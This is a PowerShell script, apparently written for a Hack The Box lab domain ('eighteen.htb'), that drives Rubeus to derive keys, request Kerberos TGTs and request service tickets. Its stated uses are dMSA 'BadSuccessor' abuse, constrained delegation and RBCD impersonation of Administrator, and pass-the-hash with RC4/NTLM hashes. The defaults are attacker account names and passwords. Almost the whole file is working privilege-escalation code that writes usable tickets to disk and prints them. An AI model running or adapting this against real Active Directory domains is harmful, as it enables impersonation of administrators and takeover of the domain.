# Get-dMSATicket.ps1
# General Rubeus ticket helper: TGT acquisition + optional TGS request.
# Supports: dMSA abuse, constrained delegation (S4U2Proxy), RBCD, TGT-only.
#
# Examples:
#   dMSA (BadSuccessor):
#     .\Get-dMSATicket.ps1 -MachineUser Pwn$ -MachinePassword Password123! -TargetUser attacker_dMSA$ -Dmsa
#
#   Constrained delegation / RBCD — impersonate Administrator to cifs/target:
#     .\Get-dMSATicket.ps1 -MachineUser svc$ -MachinePassword P@ss -ServiceSpn cifs/<TARGET>.<DOMAIN> -ImpersonateUser Administrator
#
#   TGT only (no asktgs):
#     .\Get-dMSATicket.ps1 -MachineUser svc$ -MachinePassword P@ss -SkipTgs
#
#   Supply pre-computed AES256 key (skip hash derivation):
#     .\Get-dMSATicket.ps1 -MachineUser svc$ -AES256Key <HEX64> -SkipTgs

param(
    # --- Identity ---------------------------------------------------------------
    [string]$RubeusPath       = ".\Rubeus.exe",
    [string]$MachineUser      = "Pwn$",           # User whose TGT to request
    [string]$MachinePassword  = "Password123!",   # Plaintext password (omit if -AES256Key supplied)
    [string]$AES256Key        = "",               # Pre-computed AES256 key; skips Rubeus hash step
    [string]$RC4Hash          = "",               # RC4/NTLM hash alternative to password/AES key
    [string]$Domain           = "eighteen.htb",

    # --- DC targeting -----------------------------------------------------------
    [string]$DcHostname       = "DC01",           # DC short hostname (was hardcoded)

    # --- TGS options (ignored when -SkipTgs) ------------------------------------
    [switch]$SkipTgs,                             # Get TGT only; skip asktgs
    [string]$TargetUser       = "attacker_dMSA$", # /targetuser for asktgs (dMSA or S4U)
    [string]$ServiceSpn       = "",               # SPN override; defaults to krbtgt/<Domain> for dMSA
    [string]$ImpersonateUser  = "",               # Adds /impersonateuser (S4U2Self/Proxy paths)
    [switch]$Dmsa,                                # Add /dmsa /opsec flags (BadSuccessor path)

    # --- Output -----------------------------------------------------------------
    [string]$OutFile          = "ticket.kirbi"
)

$DcFqdn = "$DcHostname.$Domain"
if (-not $ServiceSpn) { $ServiceSpn = "krbtgt/$Domain" }

# ---------------------------------------------------------------------------
# Step 1 — resolve credential material (password → AES256, or use supplied key)
# ---------------------------------------------------------------------------
if ($AES256Key) {
    $aes256 = $AES256Key
    Write-Host "[*] Using supplied AES256 key." -ForegroundColor Cyan
} elseif ($RC4Hash) {
    # Rubeus asktgt accepts /rc4 directly; derive nothing, pass hash in Step 2
    $aes256 = $null
    Write-Host "[*] Using supplied RC4/NTLM hash." -ForegroundColor Cyan
} else {
    Write-Host "[*] Deriving AES256 key for $MachineUser ..." -ForegroundColor Cyan
    $hashOut = & $RubeusPath hash /password:$MachinePassword /user:$MachineUser /domain:$Domain 2>&1 | Out-String

    $aes256 = ($hashOut -split "`n" | Where-Object { $_ -match 'aes256_cts_hmac_sha1\s*:\s*([A-Fa-f0-9]{64})' } |
               ForEach-Object { $Matches[1] } | Select-Object -First 1)

    if (-not $aes256) {
        Write-Error "[-] Failed to extract AES256 key. Rubeus output:`n$hashOut"
        exit 1
    }
    Write-Host "[+] AES256: $aes256" -ForegroundColor Green
}

# ---------------------------------------------------------------------------
# Step 2 — request TGT
# ---------------------------------------------------------------------------
Write-Host "[*] Requesting TGT for $MachineUser from $DcFqdn ..." -ForegroundColor Cyan

if ($RC4Hash) {
    $tgtOut = & $RubeusPath asktgt /user:$MachineUser /rc4:$RC4Hash /domain:$Domain /dc:$DcFqdn /nowrap 2>&1 | Out-String
} else {
    $tgtOut = & $RubeusPath asktgt /user:$MachineUser /aes256:$aes256 /domain:$Domain /dc:$DcFqdn /nowrap 2>&1 | Out-String
}

$tgtB64 = ($tgtOut -split "`n" |
           Select-String -Pattern '^\s{6}([A-Za-z0-9+/=]{20,})' |
           ForEach-Object { $_.Matches[0].Groups[1].Value }) -join ''

if ($tgtB64.Length -lt 100) {
    Write-Error "[-] Failed to extract TGT. Rubeus output:`n$tgtOut"
    exit 1
}
Write-Host "[+] TGT obtained (length $($tgtB64.Length))" -ForegroundColor Green

if ($SkipTgs) {
    Write-Host ""
    Write-Host "==== BASE64_TGT_START ====" -ForegroundColor Yellow
    Write-Host $tgtB64
    Write-Host "==== BASE64_TGT_END ====" -ForegroundColor Yellow
    exit 0
}

# ---------------------------------------------------------------------------
# Step 3 — request TGS
# ---------------------------------------------------------------------------
Write-Host "[*] Requesting TGS — service: $ServiceSpn, targetuser: $TargetUser ..." -ForegroundColor Cyan

$tgsArgs = @(
    "asktgs",
    "/targetuser:$TargetUser",
    "/service:$ServiceSpn",
    "/nowrap",
    "/outfile:$OutFile",
    "/ticket:$tgtB64"
)
if ($Dmsa)            { $tgsArgs += @("/dmsa", "/opsec") }
if ($ImpersonateUser) { $tgsArgs += "/impersonateuser:$ImpersonateUser" }

$tgsOut = & $RubeusPath @tgsArgs 2>&1 | Out-String

$tgsB64 = ($tgsOut -split "`n" |
           Select-String -Pattern '^\s{6}([A-Za-z0-9+/=]{20,})' |
           ForEach-Object { $_.Matches[0].Groups[1].Value }) -join ''

if ($tgsB64.Length -lt 100) {
    Write-Error "[-] Failed to extract TGS. Rubeus output:`n$tgsOut"
    exit 1
}

Write-Host "[+] Ticket obtained (length $($tgsB64.Length))" -ForegroundColor Green
Write-Host ""
Write-Host "==== BASE64_TICKET_START ====" -ForegroundColor Yellow
Write-Host $tgsB64
Write-Host "==== BASE64_TICKET_END ====" -ForegroundColor Yellow
